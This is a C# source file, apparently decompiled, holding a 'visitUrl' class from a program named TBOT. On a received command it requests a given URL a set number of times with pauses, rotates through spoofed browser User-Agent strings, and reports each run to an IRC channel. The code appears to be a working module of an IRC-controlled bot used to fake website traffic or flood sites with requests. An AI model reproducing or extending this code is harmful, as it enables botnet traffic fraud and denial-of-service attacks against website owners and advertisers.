using System;
using System.IO;
using System.Net;
using System.Threading;

namespace TBOT;

internal class visitUrl
{
	private string[] browserAgents = new string[18]
	{
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2", "Mozilla/5.0 (Windows; U; Windows NT 6.0; pl; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2", "Mozilla/5.0 (Windows CE; U; Mobile; iPhone; PPC; en) AppleWebKit/522+ (KHTML, like Gecko) WM5 Iris/1.0.16 Safari/419.3", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729", "Mozilla/5.0 (Windows CE; U; Mobile; iPhone; PPC; en) AppleWebKit/522+ (KHTML, like Gecko) WM5 Iris/1.0.16", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; WOW64; Trident/4.0; FunWebProducts; SLCC1; .NET CLR 2.0.50727", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR", "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.8) Vodafone/1.0/HTC_v1510/1.23.163.2", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; WOW64; GTB6.4; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506", "Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.8) Vodafone/1.0/HTC_v1510/1.23.163.2", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729", "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2) Gecko/20100323 Firefox/3.6.2", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)", "Opera/9.80 (Windows NT 5.1; U; pl) Presto/2.2.15 Version/10.10", "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2) Gecko/20100323 Namoroka/3.6.2", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SIMBAR={313309AF-5B1A-464B-A9F2-A04047C47993}"
	};

	private string[] args;

	public visitUrl(string cmd)
	{
		if (cmd != "" && cmd != null)
		{
			args = cmd.Split(new char[1] { ' ' });
			Thread thread = new Thread(selector);
			thread.Start();
		}
	}

	private void selector()
	{
		int result;
		switch (args.Length)
		{
		case 1:
			visit(args[0]);
			break;
		case 2:
			if (int.TryParse(args[1], out result))
			{
				visit(args[0], result);
			}
			break;
		case 3:
		{
			decimal sleep;
			try
			{
				sleep = decimal.Parse(args[2]);
			}
			catch (Exception)
			{
				break;
			}
			if (int.TryParse(args[1], out result))
			{
				visit(args[0], result, sleep);
			}
			break;
		}
		}
	}

	private void visit(string url)
	{
		bool flag = true;
		DateTime now = DateTime.Now;
		Irc.WriteTo(Config.ircChannel, "Visting '" + url + "'");
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
			httpWebRequest.UserAgent = browserAgents[new Random().Next(browserAgents.Length)];
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			Stream responseStream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream);
			streamReader.ReadToEnd();
			streamReader.Close();
			responseStream.Close();
			httpWebResponse.Close();
		}
		catch (Exception)
		{
			flag = false;
		}
		TimeSpan timeSpan = DateTime.Now - now;
		if (flag)
		{
			Irc.WriteTo(Config.ircChannel, "Done Visiting ~(" + timeSpan.TotalSeconds + "s)");
		}
		else
		{
			Irc.WriteTo(Config.ircChannel, "Visiting Failed.");
		}
	}

	private void visit(string url, int times)
	{
		bool flag = true;
		DateTime now = DateTime.Now;
		Irc.WriteTo(Config.ircChannel, "Visting '" + url + "' " + times + " times");
		for (int i = 0; i < times; i++)
		{
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
				httpWebRequest.UserAgent = browserAgents[new Random().Next(browserAgents.Length)];
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				Stream responseStream = httpWebResponse.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				streamReader.ReadToEnd();
				streamReader.Close();
				responseStream.Close();
				httpWebResponse.Close();
			}
			catch (Exception)
			{
				flag = false;
				break;
			}
		}
		TimeSpan timeSpan = DateTime.Now - now;
		if (flag)
		{
			Irc.WriteTo(Config.ircChannel, "Done Visiting ~(" + timeSpan.TotalSeconds + "s)");
		}
		else
		{
			Irc.WriteTo(Config.ircChannel, "Visiting Failed.");
		}
	}

	private void visit(string url, int times, decimal sleep)
	{
		bool flag = true;
		DateTime now = DateTime.Now;
		Irc.WriteTo(Config.ircChannel, "Visting '" + url + "' " + times + " times with " + sleep + "s Sleep");
		for (int i = 0; i < times; i++)
		{
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
				httpWebRequest.UserAgent = browserAgents[new Random().Next(browserAgents.Length)];
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				Stream responseStream = httpWebResponse.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				streamReader.ReadToEnd();
				streamReader.Close();
				responseStream.Close();
				httpWebResponse.Close();
				Thread.Sleep((int)(sleep * 1000m));
			}
			catch (Exception)
			{
				flag = false;
				break;
			}
		}
		TimeSpan timeSpan = DateTime.Now - now;
		if (flag)
		{
			Irc.WriteTo(Config.ircChannel, "Done Visiting ~(" + timeSpan.TotalSeconds + "s)");
		}
		else
		{
			Irc.WriteTo(Config.ircChannel, "Visiting Failed.");
		}
	}
}
